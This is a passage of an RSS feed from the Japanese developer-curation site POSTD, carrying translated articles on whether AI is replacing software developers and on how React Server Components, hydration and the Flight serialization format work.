<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[POSTD | ニジボックスが運営するエンジニアに向けたキュレーションメディア]]></title><description><![CDATA[POSTD は、ニジボックスが運営する、エンジニアに向けたキュレーションメディアです。ニジボックスはWebサービスの企画、制作、開発、運用を一貫して担うリクルートの100%子会社です。 リクルートグループのオンラインサービスをはじめ、様々な業種・業界・業態のサービス開発を行っております。]]></description><link>https://postd.cc</link><generator>GatsbyJS</generator><lastBuildDate>Fri, 27 Jun 2025 02:19:25 GMT</lastBuildDate><language>ja</language><atom:link href="https://postd.cc/feed/" rel="self" type="application/rss+xml"/><image><title>POSTD | ニジボックスが運営するエンジニアに向けたキュレーションメディア</title><link>https://postd.cc</link></image><item><title><![CDATA[ポストデベロッパー時代]]></title><description><![CDATA[今から2年前の2023年3月に“The End of Front-End Development”（フロントエンド開発の終焉）という記事を投稿しました。ちょうどOpenAIがGPT-4を発表した後で…]]></description><link>https://postd.cc/the-post-developer-era/</link><guid isPermaLink="false">https://postd.cc/the-post-developer-era/</guid><category><![CDATA[キャリア・働き方]]></category><category><![CDATA[生成AI]]></category><pubDate>Thu, 26 Jun 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>今から2年前の2023年3月に“<a href="https://www.joshwcomeau.com/blog/the-end-of-frontend-development/">The End of Front-End Development</a>”（フロントエンド開発の終焉）という記事を投稿しました。ちょうどOpenAIがGPT-4を発表した後で、多くの人が近い将来、ソフトウェアはすべて機械が作るようになり、人間のソフトウェア開発者は不要になるだろうという考えに傾いていました。</p>
<p>筆者はこうした論調には懐疑的で、当面の間、ソフトウェア開発は依然として人間の助けを必要とするだろうと前述の記事の中で主張し、その理由を論じました。筆者が立てた仮説は、大規模言語モデル（LLM）は人間の開発者を置き換えるのではなく、補強するというものです。</p>
<p>当時、Twitter上ではAIの登場により数カ月、長くても1、2年で人間のフロントエンド開発者の需要は無くなるとの意見が大勢を占めていました。あれから2年以上が経ちますが、現実はどうでしょうか。当時言われていたような「ポストデベロッパー」時代は到来しているでしょうか。</p>
<p>この記事では、現在の状況を新たな視点から捉え直し、何がどう変わったのか、今後どのような進化の過程を辿るのかを検討してみたいと思います。この記事が、開発者を志しながらも今後のキャリアに不安を覚えている読者の参考になれば幸いです。❤️</p>
<h2>企業によるAIの利用状況</h2>
<p>ここ数年、AIツールを導入する企業がますます増えています。最近、フォーブス誌に“<a href="https://www.forbes.com/sites/jackkelly/2024/11/01/ai-code-and-the-future-of-software-engineers/">AI Writes Over 25% Of Code At Google</a>”（Google社では25%以上のコードをAIが書いている）という記事が掲載されました。</p>
<p>この記事のタイトルは、AIが25％、人間が残りの75%の仕事を行っているように読めますが、実際はそうではありません。これは誤解を招くタイトルだと思います。</p>
<p>Google社でコミットされるコードの25%をAIが生成していたとしても、AIが単独で作業を行っているわけではありません。熟練した人間の開発者が運転席に座り、知識と経験をもとにAIを操り、生成物を編集したり形成したりした上で、自分が書いたコードに組み込んでいるのです。筆者の知る限り、Google社では今もコードは100%「開発者」が作成しています。AIは彼らが仕事で使う多くのツールの一つに過ぎないのです。</p>
<p>つまり、Google社は製品チームの開発者の25％を解雇し、疑似知性を持つAIロボットがその代わりを務め、プロダクトマネージャー直属の部下として自律的に作業を行っているわけではないということです。大手ハイテク企業でそのようなことが起きているという話は聞いたことがありません。</p>
<p>一方で、自社のAIが人間の開発者を完全に置き換えることができると主張しているスタートアップ企業はあります。中でも最もよく知られているのは、1年前の2024年3月にCognition社が発表したDevinという製品です。しかし、実際に企業が使おうとすると、さまざまな問題に直面します。例えば、あるチームの報告によると、Devinは割り当てられた<a href="https://www.answer.ai/posts/2025-01-08-devin.html">20件のタスクのうち3件しか完了できず</a>、結局は手間がかかり導入する価値はないと判断されたようです。このチームは1カ月で使うのをやめました。</p>
<p>一部のメンバーの声を紹介します。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>AIは十分に定義された小さなタスクはこなせますが、自分でやった方が早く、好きなやり方でできるので、その方がいいです。時間を節約できそうな大きなタスクは失敗する可能性が高いと思います。結局、使いたい場面があまりないという印象です。</p><p>-- ジョノ・ウィテカー<br></p></div></div>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>自分で手を加えられるので、最初はすごく身近に感じられて感動したのですが、使っているうちに変更が必要な点がどんどん出てきて、次第に不満が溜まるようになりました。最終的には一から順番にやり直した方がいいという結論に達しました。</p><p>-- アイザック・フラス<br></p></div></div>
<p>これらの意見はAI懐疑論者のものではなく、AI関連のスタートアップ企業に在籍し、熱意と善意を持って製品を使ってみた技術者のものです。また、彼らの体験は例外的ではありません。他にもいくつか実際にAIを使用した人の体験談・ブログなどを読みましたが、どれもあまり役に立たないという結論で一致していました。</p>
<p><strong>筆者の知る限り、AI導入の成功事例には必ず熟練した人間の開発者が関わっています</strong>。したがって、ポストデベロッパー時代は到来していないと言えるでしょう。</p>
<h2>逸脱するAI</h2>
<p>筆者自身、数年前から多数のAIツールを試してみています。数カ月前、AI駆動の統合開発環境（IDE）である<a href="https://www.cursor.com/">Cursor</a>に乗り換えました。Claude SonnetでCursorの「エージェント」モードを使っていますが、率直に言ってかなり素晴らしいです。特定の種類のタスクでは、コンテキスト情報を与えて正しい方向を示せば、実行可能なソリューションを一発で生成してくれます。</p>
<p>TypeScriptの型のエラーやリンターエラーを検出し、多くの場合、修正することもできます。新たな発見や学びが得られたことも何度かありました。筆者が知らないAPIを使ったソリューションをAIが提案してくれたおかげで、当初検討していたものよりも良いコードが書けました。</p>
<p><strong>しかし、AIは完璧ではありません</strong>。誘導する必要があります。</p>
<p>感覚的には、”クルーズコントロール”を使って高速道路を走るのに近いかもしれません。車は概ね進行方向に沿って走りますが、フラフラしないようハンドルを握る必要があります。そうしないと、車が徐々に車線からはみ出してしまいます。時折車線内に戻してあげないと、側溝に落ちてしまいます。</p>
<p><strong>開発者不要論の問題点はまさにそこにあります</strong>。コードの書き方を知らなければ、モデルが生成したコードに重大な問題が潜んでいたとしても、気づくことができません。軌道修正の図り方も、軌道修正が必要であることも分からないでしょう。</p>
<p>LLMを使ってノーコードでプロジェクトを構築した人の話を聞くと、みな同様の経験をしています。出だしは好調でも、やがてどうAIを促してもこれ以上は進めないという局面に行き着きます。コードはちぐはぐで混沌とし、ある一定の線を越えるといくら応急処置を施しても維持できなくなります。そうなると、プログラム全体が破綻してしまいます。</p>
<p>また、LLMが不得意なタスクもたくさんあります。10分かけてClaudeに意図を理解させようとするもできず、諦めて自分で実装したら5分でできたというようなストレスの溜まる経験をしたことも何度かあります。次第にどのタスクをAIに任せ、どのタスクは昔ながらの方法で処理するのがいいか直感で分かるようになってきました。</p>
<p>総合すると、LLMはかなりの時間を節約してくれます。自分でやると30分かかる作業をLLMが30秒で終わらせてくれたこともあります。そういう時は本当に爽快です。しかし、実際のところ、自らコードを書いている時間の方がまだ圧倒的に多いです。</p>
<p>プロレスのタッグマッチのように、Claudeが得意なタスクではタッチして交代し、処理してもらいます。しかし、まだ自分でやるほうが速く簡単なので、ほとんどのコードは自分が書いています。</p>
<h2>現在の就職市場</h2>
<p>何年か前にこの記事を書いたとき、就職市場はかなり厳しい状況にありました。残念ながら、現在もまだ厳しい状況は変わっていません。</p>
<p>求職中の読者は、以前ほど質の高い求人がなく、良い求人には応募が殺到することをご存知でしょう。面接の機会を得るのも非常に難しく、内定をもらうのがいかに難しいかは言うまでもありません。</p>
<p>しかし、この状況は企業が開発者を自律型AIエージェントに置き換えているからではないと思います。すでに述べたとおり、筆者がこれまで読んできた実際の体験談はその仮説を裏付けるものではありません。では何が起きているのでしょうか。なぜこれほど厳しい状況が続いているのでしょうか。</p>
<p>これにはいくつかの要因が絡んでいると思います。</p>
<ol>
<li><strong>マクロ経済的要因</strong>。金利がまだ比較的高く、スタートアップ企業は事業を拡大し開発者を雇うのに必要な資金を調達するのが難しい状況にあります。ここ数年、景気後退が間近に迫っているという景況感が続いています。</li>
<li><strong>レイオフ</strong>。大手ハイテク企業は、ここ数年の間に数十万人の労働者をさまざまな理由で一時的に解雇しています。これはつまり、多くの有能な開発者が仕事を探しているということです。</li>
<li><strong>AI神話</strong>。一部の企業は、いまだにAIが近い将来開発者を不要にすると考えており、積極的な雇用を行っていません。</li>
</ol>
<p>3つ目に挙げた点については特にもどかしい思いがします。AGI* が実用化直近であり、実用化されれば人間の開発者は一切不要になると信じて企業は必要な開発者の雇用を控えているのです。「じきにそうなります」と言い始めてもう数年が経ちます。</p>
<p>*汎用人工知能: 人間のように学習・推論したり、まだ学んでいないこともこなすことができるAI。</p>
<h2>今後の展望</h2>
<p>2023年に“<a href="">The End of Front-End Development</a>”を執筆した当時、筆者は開発者を目指しキャリアをスタートさせたばかりで、コーディングを勉強中の読者にメッセージを届けたいと考えていました。世間の見通しがあまりに暗かったため、ネット上に渦巻く FUD* を少しでも解消したいと思っていました。</p>
<p>*不安や懸念、不透明感</p>
<p>過去2年間でさまざまな変化がありましたが、変わっていないことが2つあります。</p>
<ol>
<li>企業は製品を作るためにまだ人間の開発者を必要としています。</li>
<li>AIエバンジェリストは、もうじき企業は製品を作るのに人間の開発者が不要になるといまだに主張しています。</li>
</ol>
<p>開発者を目指し大学やブートキャンプ、または独学で勉強中の読者もいると思いますが、<strong>皆さんが就職するチャンスはあると確信しています</strong>。ソフトウェア開発が完全に自動化されるのはまだかなり先の話だというのは明らかです。開発者の代わりではなく、開発者の生産性を高めるツールとしてAIを活用した方が遥かに効果的であることに企業が気づけば、自らの成長を妨げるような行為をやめ、より積極的に雇うようになると思います。</p>
<p>AIモデルは間違いなく改善し続けるでしょう。毎週のように新しいモデルがリリースされてはベンチマークの記録を更新しています。最近では、Google社が<a href="https://deepmind.google/technologies/gemini/">Gemini 2.0 Flashと2.5 Pro</a>モデルを発表しました。</p>
<p><img src="https://www.joshwcomeau.com/images/the-post-developer-era/chart-speed.png"></p>
<p><img src="https://www.joshwcomeau.com/images/the-post-developer-era/chart-intelligence.png">
出典：<a href="https://artificialanalysis.ai/">Artificial Analysis</a></p>
<p>テクノロジーは進化の曲線がより緩やかになるポイントに達したように筆者は感じています。ゲームチェンジャーと呼べるような発表はしばらく出ていません。新たに出てくるモデルは少しずつ改良されてはいますが、全く新しい課題を解決するというより、すでに優れている点をさらに向上させるものです。</p>
<p>現在の就職市場は見通しが厳しいと感じますが、少なくとも米国では正しい方向に進んでいます。</p>
<p><img src="https://www.joshwcomeau.com/images/the-post-developer-era/yoy-graph.jpg">
出典：<a href="https://bsky.app/profile/josephpolitano.bsky.social/post/3ljs5yzcg3c2k">Joey Politano</a>のラブリーなグラフ！</p>
<p>AIによって本当にソフトウェア開発者が不要になっているのであれば、ハイテク系の雇用数は急速に減少しているはずだと思いますが、この1年の雇用数は増えています。この傾向が続けば、近い将来市場の見通しはかなり明るくなるでしょう。</p>
<h2>懸念点</h2>
<p>2023年の時点で、AIがすぐにソフトウェア開発者の仕事を奪うことにはならないという自信がそれなりにありました。それから2年が経ち、その自信は一層深まりました。コーディングは依然として極めて貴重なスキルであり、それがすぐに変わるとは思えません。</p>
<p>とは言え、何もかも順調で誰も心配する必要はないと言っているわけでもありません。</p>
<p>昨今の世界情勢は、経済をはじめ、あらゆる面で広範な影響と不確実性をもたらしているように思います。これらがハイテク業界に与える影響については予測が難しいものの、私としては挑戦的な時期となるのではないかと考えています。</p>
<p>次の世代の開発者について少し心配しています。LLMエージェントを使っているとトランス状態に陥り、生成されるコードを理解しないまま、あるいは見ることさえしないまま、機械的に変更を受け入れるようになりがちです。<sup id="fnref-1"><a href="#fn-1" class="footnote-ref">1</a></sup>筆者も、<a href="https://whimsy.joshwcomeau.com/">新しいコースのランディングページ</a>をビルドしている際にその罠にはまりそうになっていることに気づきました。ハンドルから長く手を離し過ぎてしまったため、奇妙なジャンクコードのリファクタリングに多くの時間を費やすはめになりました。</p>
<p>最も楽な道は、何もせず機械に任せることですが、そうすると機械が行き詰まったときにコードを修正したり、デバッグしたりするのに必要なスキルが身につきません。</p>
<p>一方で、LLMを積極的に利用するのであれば、今がコーディングを学ぶ絶好の機会です。筆者の場合、よく分からないTypeScriptエラーが出たときに、AIが理解を助けてくれたり、適切な資料を見つけるために必要なキーワードを示してくれたりすることが多々あります。まるで自分だけの個人講師が不明点を理解する手助けをしてくれているような感覚です。<sup id="fnref-2"><a href="#fn-2" class="footnote-ref">2</a></sup></p>
<p>今後数年間がどうなるかは誰にも分かりませんが、1、2年後に企業がようやく人間の開発者がまだ必要であることを受け入れ、熟練した人間が強力なLLMを使うことで驚くべきことを成し遂げられることに気づき、ちょっとした「開発者ルネサンス」が起きても驚きません。✨</p>
<p>ソフトウェア開発に情熱を持ち、この仕事が高い給料を稼いでアッパーミドルクラスの暮らしを手に入れられる見込みが最もありそうだと考えているのであれば、AIの誇大宣伝に惑わされ、自信を失わないでいただきたいと思います。企業は今も雇用し続けていますし、それは当分変わらないと思います。💖</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><h2>就職活動のヒント</h2><p>現在の就職市場で仕事を勝ち取るチャンスを最大限に高める方法について話したいと思います。</p><p>最初に理解しておくべきことは、AIの登場により企業の雇用プロセスが悲惨なものになっているということです。求人を出すと、AIが生成した質の低い応募書類が何千通も届く場合があり、採用担当者にとってもすべての書類に目を通すのは困難です。求人に応募しても、他の応募書類の山に埋もれてしまう可能性が高いでしょう。</p><p>この状況に対する解決策は2つあります。</p><ul>
<li>求人が出てから数日以内の早い段階で応募する。</li>
<li>コネを頼る。</li>
</ul><p>ハイテク業界に入ってまだ日が浅い場合、おそらく人脈と呼べるようなものはないでしょう。でも大丈夫。今日から築き始めればいいのです。 😄</p><p>方法はいくつもあります。一番手っ取り早いのが、地元で開催されているオフ会を探すことです。こうしたイベントに参加すれば、自分が就職したいと思っている会社で働いている開発者に会える可能性があります。あなたの応募書類が埋もれてしまわないよう手助けしてくれるかもしれません。</p><p>しかし正直なところ、これは筆者のように内向的な読者にとっては最適な方法ではないかもしれません。筆者が駆け出しの頃は、地元のオフ会に参加しても気後れして初対面の人に話しかける勇気がありませんでした。結局コネを作ることはできず、何の役にも立ちませんでした。 😅</p><p>幸い、他にも多くの選択肢があります。筆者の場合は、自分がビルドしたプログラムをネット上に公開することでネットワークを築きました。オープンソースプロジェクトに貢献したり、Discordコミュニティで交流したりしてもいいでしょう。筆者のブログ記事“<a href="https://www.joshwcomeau.com/career/no-cs-degree-required/">Becoming a Software Developer Without a CS Degree</a>”（CSの学位がなくてもソフトウェア開発者になれる方法）に書いたように、自分の強みを生かすことが成功への近道になります。</p><p>また、コミュニティもチャンスを見つける上で助けになる場合があります。腹立たしいことに、ネット上には単にデータを集めることだけを目的とした、架空の会社の求人が無数にあります。自分のLinkedInの連絡先に登録されているユーザーの勤務先をチェックし、注目すべき実在する企業のリストを作成するのも良いでしょう。</p><p>厳しい世の中ですが、これらのヒントが時間と労力の節約になれば幸いです。❤️</p></div></div>
<div class="footnotes">
<hr>
<ol>
<li id="fn-1">イケてる若者の間では"vibe coding"と呼ばれている<a href="#fnref-1" class="footnote-backref">↩</a></li>
<li id="fn-2">ただし、その家庭教師は時々夢想的になるので、提案には少し用心しなければならない😂<a href="#fnref-2" class="footnote-backref">↩</a></li>
</ol>
</div>]]></content:encoded></item><item><title><![CDATA[React Server Componentsを理解する]]></title><description><![CDATA[React Server Componentsを理解する React Server Components（RSC）の登場により、Reactエコシステムにおけるサーバーレンダリングの重要性が高まりまし…]]></description><link>https://postd.cc/understanding-react-server-components/</link><guid isPermaLink="false">https://postd.cc/understanding-react-server-components/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[React]]></category><pubDate>Thu, 22 May 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<h2>React Server Componentsを理解する</h2>
<p>React Server Components（RSC）の登場により、Reactエコシステムにおけるサーバーレンダリングの重要性が高まりました。RSCを使用することで、デベロッパーは一部のコンポーネントをサーバー側でレンダリングしつつ、抽象化によりクライアントとサーバーの隔たりを感じさせないユーザビリティを実現することができます。Client ComponentsとServer Componentsをコード内に混在させることで、すべてのコードが1カ所で実行されているように見せることができます。</p>
<p>しかし、抽象化には常にコストが伴います。そのコストとはどのようなものでしょうか。RSCはいつ「使える」のでしょうか。バンドルサイズが小さくなると、帯域幅も狭まるのでしょうか。RSCを「使うべき」ときはいつでしょうか。RSCを適切に使う上でデベロッパーが従うべきルールは何でしょうか。そのルールが存在する理由は何でしょうか。</p>
<p>これらの問いに答えるため、RSCの仕組みを詳しく見ていきましょう。React本体と、ReactのメタフレームワークというRSCの2つの側面について考察します。特に、RSCに関する正確なメンタルモデルを構築できるよう、ReactとNext.jsの内部構造について説明します。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>この記事は、Reactを使い慣れたデベロッパーを対象としています。読者には、コンポーネントやフックに関する予備知識が前提条件として求められます。</p><p>また、JavaScriptのPromise、async、awaitについても熟知していることを想定しています。これらに関する知識がない方は、<a href="https://youtu.be/fyGSyqEX2dw?si=MkRII6BoKW8Dm-Ml">Promise、async、await</a>の仕組みに関する筆者のYouTube動画をご覧ください。</p><p>Reactのあらゆる側面についてゼロから詳しく知りたい方は、筆者の「<a href="https://understandingreact.com/">Understanding React</a>（Reactを理解する）」コースをぜひチェックしてみてください。このコースでは、Reactのソースコードを掘り下げることで、JSX、Fiber、コンポーネント、フック、フォームなどの仕組みを理解していただくことができます。</p></div></div>
<p>まずは、RSCの仕組みを理解するために必要な基本を見ていきましょう</p>
<h2>DOMとクライアントレンダリング</h2>
<p>Reactでは「レンダリング」という表現を固有の意味で使っています。一般的にはブラウザがページを「レンダリング」するという場合、DOMを画面に描画する処理をいいます。ブラウザは、DOM（要素のツリー構造）とCSSOM（計算済みスタイルのツリー構造）をもとに、各要素の配置を計算し、適切なピクセルを画面に描画します。</p>
<p>一方、Reactでは「DOMの見た目を計算すること」を「レンダリング」といいます。関数コンポーネントが返す値はReactに対し、DOMの見た目に関する情報を伝えます。</p>
<p>したがって、React（およびReactに追随する形で登場した他のフレームワーク）の世界では、「クライアントレンダリング」という場合、<strong>ブラウザ上で関数コンポーネントを実行すること</strong>をいいます。</p>
<p>Reactでいう「レンダリング」は、必ずしもブラウザによる実際のレンダリングを伴いません。なぜなら、DOMの見た目がすでにReactがこうあるべきと考える見た目になっている場合があるからです。</p>
<p>実際、Reactのコアアーキテクチャ（および他のすべてのJSフレームワーク）における重要な点は、内部コードが更新するDOMの量を制限することにあります。</p>
<h2>ツリーの差分検出処理</h2>
<p>Reactのソースコードの中には、<code class="language-text">appendChild</code>などのブラウザDOM APIを呼び出し、クライアント上のDOMを更新するコールがあります。Reactは、ツリーの差分検出処理（reconciliation）や差分計算（diff）によって、ブラウザDOM APIを実行するタイミングを決めます。</p>
<p><a href="https://tonyalicea.dev/blog/understanding-react-compiler">React Compiler</a>に関する記事に書いたように、ReactはDOMの現在の見た目と、見た目がどうあるべきかをJavaScriptオブジェクトツリーで管理しており、各ノードはFiberと呼ばれます。</p>
<p>Reactは、JavaScriptオブジェクトツリーの2つの枝でDOMの見た目がどうあるべきか（「WORK-IN-PROGRESS」）を計算し、DOMの現在の見た目（「CURRENT」）と比較します。</p>
<p>次に、2つのツリーの差分を検出し、currentツリーをworkInProgressツリーに変換するために必要なステップを計算します。そのステップは「diff」と「patch」（パッチ処理）です。</p>
<p><img src="https://tonyalicea.dev/assets/blogimages/ReactCompiler_Reconciliation.png"></p>
<p>単純なJavaScriptオブジェクトとの比較計算が終わると、実際のDOMにおいて取るべきステップが明らかになります。DOMの更新はコストがかかり、ブラウザの再レンダリング（要素の配置とピクセルの描画）を伴うため、最低限取るべきステップの数を特定することで、DOMに対して必要な更新を最小限にとどめることができます。</p>
<p>クライアント上でDOMを更新すれば、UIを更新する際にstateを保持できるメリットがあります。例えば、ユーザーがフォームに情報を入力し、Reactが何らかのイベントをもとにUIを更新しても、入力したテキストはフォーム上に保持されます（ページが再読み込みされた場合は保持されません）。</p>
<p>したがって、Reactではクライアント上でDOMを更新することを重視しており、最初に偽のDOMに対して処理を行うことで可能な限り効率的に更新しようと努めています。このようなJavaScriptのDOM構造の偽コピーを一般的に「仮想DOM」と呼びます。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p><strong>「仮想DOM」は適切な表現か？</strong></p><p>ReactにおけるDOMと似た構造のJavaScriptオブジェクトの集まりを以前は「仮想DOM」と呼んでいました。しかし、実際はiOSやAndroidのネイティブアプリ（React Native）などへのレンダリングが可能なため、Reactは今ではこの呼称を好んでいません。</p><p>実際、Reactは複数のツリーを扱います。関数コンポーネントが返すReact要素（JSオブジェクト）のツリーや、React要素を変換したもので、stateなどを格納するために使用される Fiber（同じくJSオブジェクト）のツリーなどです。 </p><p>普段はより具体的な名前でこれらのツリーを呼びますが、この記事では、RSCの仕組みを理解するうえで便利なので、昔から日常会話でよく使われている「仮想DOM」という呼称を使いたいと思います。</p></div></div>
<p>Reactが「レンダリング」と呼ぶのは、仮想DOMの計算処理です。具体的には、関数コンポーネントを実行し、リアルDOMの見た目がどうあるべきかを決めることをいいます。この処理はすべて関数を実行するJavaScriptエンジンの中で、リアルDOMに反映される差分が全く検出されなくなるまで行われます。</p>
<p><strong>Reactが「レンダリング」という表現を使う理由</strong>を理解すると、RSCを正確に説明するうえで非常に役立ちます。</p>
<p>RSCを理解するためには、Web開発におけるクライアントレンダリングおよびサーバーレンダリングと、Reactが重点を置く仮想DOMの生成の違いを明確に理解する必要があります。</p>
<p>Reactでいう「レンダリング」では、実際には必ずしも何かが目に見える形で起こるわけではありません。</p>
<p><img src="https://tonyalicea.dev/assets/blogimages/tonyalicea_cartoon1_dark.png"></p>
<p>「レンダリング」という言葉のさまざまな意味については、確認しながら説明を進めたいと思います。一般的な（React以外での）定義を「古典的」と呼び、Web開発の用語として定義してみましょう。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>レンダー【render】
【動詞】 /réndər/</p><ol>
<li>（古典的クライアントサイド）DOMとCSSOMをもとにレイアウトを計算し、画面にピクセルを描画すること。</li>
<li>（Reactクライアントサイド）仮想DOMを構築して更新するために関数コンポーネントを実行すること。 </li>
</ol></div></div>
<h2>DOMとサーバーレンダリング</h2>
<p>RSCについて説明を進めるには、時間を遡る必要があります。長年、インターネットの中心概念の一つとして、サーバーからHTMLを配信するという考え方があります。</p>
<p>サーバー上にHTMLファイルを（NodeJSやPHPなどのサーバー技術を使って）作成することを、古典的な「サーバーサイドレンダリング」や「サーバーレンダリング」と呼びます。これは、先ほど説明した古典的なクライアントレンダリングの意味とも違います。従来、サーバーレンダリングとはサーバー上で「HTMLの文字列を生成する」ことを意味しました。</p>
<p>これにはいくつかの利点があります。ブラウザはHTMLを素早くDOMに変換することができます。そのため、HTMLは「ブラウザ上で素早くレンダリング」されます。JavaScriptでDOMを更新すると、もっと時間がかかります。また、サーバーの方がデータベースやファイルストレージに近いため、これらの処理をより効率的に行うことができます。</p>
<p>デメリットとしては、クライアントは再度HTMLを要求することができますが、stateが失われてしまいます（ページが再読み込みされる）。</p>
<p>Web開発においては、そのバランスをどう取るかが長年課題となっていました。サーバー側でレンダリングされたHTMLは素早く表示されますが、クライアント側のJavaScriptを通じてDOMを更新すると、ページのstateを維持したまま変更を加えることができます。</p>
<p>Reactでは両方行えますが、それは何も新しいことではありません。Reactはクライアント側のJavaScriptを使ってDOMを更新しますが、デベロッパーはかなり前からReactのコンポーネントをサーバー側でレンダリング（SSR）することができていました。</p>
<p>サーバー（NodeJSなどを通じて独自のJavaScriptエンジンを実行）は、コンポーネントを実行し、クライアントに送信するHTML文字列を生成します。ただし、大きな注意点があります。同じコンポーネントのJavaScriptコードもすべてクライアントに送信して実行する必要があったのです。</p>
<p>それはなぜでしょうか。関数コンポーネントが返す値をもとに仮想DOMを構築できるようにするためです。仮想DOMはリアルDOMを「ハイドレート」するために使用します。これは例えば、ボタンがクリックされたときに、どの関数コンポーネントの中のどのクリックイベントを実行するべきかがわかるということです。覚えておかなくてはならないのは、Reactが機能するためには、クライアント上に両方のツリー（DOMと仮想DOM）が存在する必要があるということです。したがって、ReactにおけるSSRでは、関数を2回実行する必要があります（1回はサーバー上でHTMLを生成するため、もう1回はクライアント上で仮想DOMを作成するため）。</p>
<p>参考までに、SSR／ハイドレーションプロセスを以下に可視化しています。</p>
<div class="video"><video loop autoplay muted playsinline aria-labelledby="video-label" src="https://tonyalicea.dev/assets/blogvideos/RSC_SSRHydration.mp4"></video></div>
<p>ここでReact Server Componentsの登場です。RSCは、サーバー上で実行されるReactコンポーネントとクライアント上で実行されるReactコンポーネントを、サ<strong>ーバーコンポーネントのJavaScriptコードの送信と再実行を行うことなく</strong>混在させることができます。さらに、ブラウザ上でDOMの更新を始める前に、最初にサーバー上でHTMLをレンダリングすることも可能です。</p>
<p>なぜ可能なのでしょうか。</p>
<p>まずは用語の定義を更新しましょう。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>レンダー【render】
【動詞】 /réndər/レンダリング</p><ol>
<li>（古典的クライアントサイド）DOMとCSSOMをもとにレイアウトを計算し、画面にピクセルを描画すること。</li>
<li>（Reactクライアントサイド）仮想DOMを構築して更新するために関数コンポーネントを実行すること。 </li>
<li>（古典的サーバーサイド）DOMを構築するためにクライアントに送信するHTMLを生成すること。</li>
<li>（ReactサーバーサイドSSR）DOMを構築するためにクライアントに送信するHTMLを生成するために関数コンポーネントを実行すること。</li>
</ol></div></div>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p><strong>サーバーサイド生成はどうか?</strong></p><p>ここで取り上げていないものの一つがSSG（サーバーサイド生成）です。これは、アプリをビルドする（デプロイ可能にする）際に、HTMLをあらかじめ生成することを意味します。これは、Client ComponentsとServer Componentsの両方に対して行えます。</p><p>SSGの定義は、作成中の辞書収録項目におけるSSRの定義と同じです。この記事では、SSGとSSRの違いを明らかにしてもあまり役に立たないので詳しくは述べませんが、SSGもサポートされています。</p></div></div>
<p>先ほど、Reactが機能するためには、DOMと仮想DOMの両方のツリー全体がブラウザのメモリ上に存在しなくてはならないとお話ししました。では、React Server Componentsがサーバー上でのみ実行されればよく、クライアントがJavaScriptコードをダウンロードして実行する必要がないのはなぜでしょうか。</p>
<p>つまり、Reactは「サーバー」上で実行された関数によってレンダリングされた部分について、どのようにして「ブラウザ」上に仮想DOMを構築するのでしょうか。</p>
<h2>Flight</h2>
<p>サーバー上で関数コンポーネントを実行し、その結果をもとにクライアント上に仮想DOMを構築できるようにするために、Reactはサーバー上で実行された関数が返したReact要素ツリーを「シリアライズ」する機能を追加しました。</p>
<p>多くの場合、シリアライズは「コンピューターのメモリ上のオブジェクトを文字列に変換する」こと、デシリアライズは「文字列をコンピューターのメモリ上のオブジェクトに復元する」ことを意味します。</p>
<p>この場合、関数コンポーネントの結果はシリアライズしてクライアントに送信する必要があります。</p>
<p>筆者のReactコースに登録した生徒の数を把握するための簡単なアプリを作成するとします。まずはNext.jsで基本的なRSCを作成します。これはサーバー上で実行されます。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p><strong>同型コンポーネント</strong></p><p>サーバーとクライアントの両方で実行可能なコンポーネントを「同型（isomorphic）」と呼びます。上の関数はサーバーに特化したこと（データベースに直接接続する、サーバー上のファイルを読むなど）を何も行わないため、クライアント上で実行することも可能であり、Reactは通常どおり直接その結果をもとに仮想DOMを構築することができます。</p><p>関数が同型である場合、共有することができます。Server ComponentsとClient Componentsのどちらもそれをインポートして使用することができます。</p></div></div>
<p>この関数を実行するためにクライアントに送信しなくてもいいように、その結果をシリアライズする必要があります。Reactのコードベースの中では、このシリアライズ形式を「Flight」と呼び、送信したデータの総和を「RSC Payload」と呼びます。</p>
